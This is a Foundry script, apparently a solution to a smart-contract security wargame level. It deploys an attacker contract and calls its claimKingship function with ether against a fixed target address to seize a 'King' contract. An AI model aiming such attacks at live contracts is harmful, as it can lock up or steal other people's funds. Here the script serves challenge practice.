pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Solutions/OverthrowKing.sol";
import "../lib/forge-std/src/console.sol";

contract KingCracker is Script {
    OverthrowKing overthrowKing;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        overthrowKing = new OverthrowKing();
        bool sent = overthrowKing.claimKingship{value: 2000000000000000 wei}(
            0xe0329807B0556a55eDFBBa013184b22C736aaF41
        );
        console.log(sent);
        vm.stopBroadcast();
    }
}
